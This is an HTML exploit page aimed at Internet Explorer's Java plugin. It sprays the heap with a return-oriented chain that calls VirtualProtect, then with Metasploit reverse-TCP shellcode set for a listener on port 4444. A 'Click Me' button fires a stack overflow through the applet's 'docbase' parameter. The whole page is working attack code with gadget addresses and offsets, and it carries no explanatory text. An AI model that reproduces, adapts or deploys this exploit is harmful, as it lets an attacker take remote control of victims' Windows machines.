<html>
<head>
  <link rel="shortcut icon" href="http://127.0.0.1:9999/x.ico" />
  <script src="heaplib.js"></script>

  <script>
  function packv(n) {
    var s = new Number(n).toString(16);
    while(s.length < 8) s = "0" + s;
    return(unescape("%u" + s.substring(4,8) + "%u" + s.substring(0,4)));
  }

  function little_endian(n) {
    var s = new Number(n).toString(16);
    while(s.length < 8) s = "0" + s;
    var r = "";
    for(i = 6; i >= 0; i-= 2)
      r += "%" + s.substring(i, i + 2);
    return(unescape(r));
  }

  function spray_heap() {
    heap = new heapLib.ie(0x20000);

    var payload, block1, nopsled1;

    // Don't care
    payload = unescape("%u9090%u9090")
    // pop eax; ret
    payload += unescape("%u4cc1%u7c34")
    // VPS
    payload += unescape("%ua140%u7c37")
    // mov eax, [eax]; ret
    payload += unescape("%u30ea%u7c35")
    // call eax; ret
    payload += unescape("%u1fe4%u7c34") 
    // VPS Params
    payload += unescape("%u2020%u0a0a")
    payload += unescape("%u4000%u0000")
    payload += unescape("%u0040%u0000")
    payload += unescape("%u0a0a%u0a0a")

    payload += unescape("%u2048%u0a0a")

    // windows/shell_reverse_tcp - 324 bytes
    // https://metasploit.com/
    // VERBOSE=false, LHOST=127.0.0.1, LPORT=4444, 
    // ReverseAllowProxy=false, ReverseListenerThreaded=false, 
    // StagerRetryCount=10, StagerRetryWait=5, 
    // PrependMigrate=false, EXITFUNC=process, CreateSession=true, 
    // AutoVerifySession=true
    payload += unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%uff07%ub8d5%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u50d5%u5050%u4050%u4050%u6850%u0fea%ue0df%ud5ff%u6a97%u6805%u007f%u0100%u0268%u1100%u895c%u6ae6%u5610%u6857%ua599%u6174%ud5ff%uc085%u0c74%u4eff%u7508%u68ec%ub5f0%u56a2%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff");

    // Word align
    // payload += unescape("%u9090")

    block1 = unescape("%u9090%u9090");

    // build nopsled1
    nopsled1 = payload;
    while(nopsled1.length < 0x1000)
      nopsled1 += block1;

    var heapblock1 = nopsled1;

    while(heapblock1.length < 0x40000)
      heapblock1 += heapblock1;

    var trimmedblock1 = heapblock1.substring(2, 0x40000 - 0x21);

    // heap spray
    for(var i = 0 ; i < 800 ; i++)
      heap.alloc(trimmedblock1);
    }

  function trigger() {
    var buf = "";
    //= unescape("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba");

    // A's
    //for(i = 0; i < 200; i++)
    //  buf += unescape("%08%08%08%08");
    //
    // Offsets:
    // eip -> 392
    //
    // Gadget Addresses:
    // 
    // leave; ret           -> 0x7c3411a4
    // pop eax; ret         -> 0x7c344cc1
    // mov eax, [eax]; ret  -> 0x7c3530ea
    // call eax; ret        -> 0x7c341fe4
    //
    // Virtual Protect Stub -> 0x7c37a140
    // VPS Params:
    // 0x0a0a2020
    // 0x00004000
    // 0x00000040
    // 0x0a0a0a0a

    for(i = 0; i < 97; i++)
      buf += unescape("%45%46%47%48");

    
    // overwrite ebp 
    buf += unescape("%20%20%0a%0a")
    // leave; ret
    buf += unescape("%a4%11%34%7c")

    var htmlTags =
      "<object type='application/x-java-applet'>" +
      "<param name='launchjnlp' value='1'>" +
      "<param name='docbase' value='" + buf + "'>" +
      "</object>";

    document.write(htmlTags);
  }
  </script>
</head>
<body onload="spray_heap()">
  <input type="button" value="Click Me" onclick="trigger()">
</body>
</html>

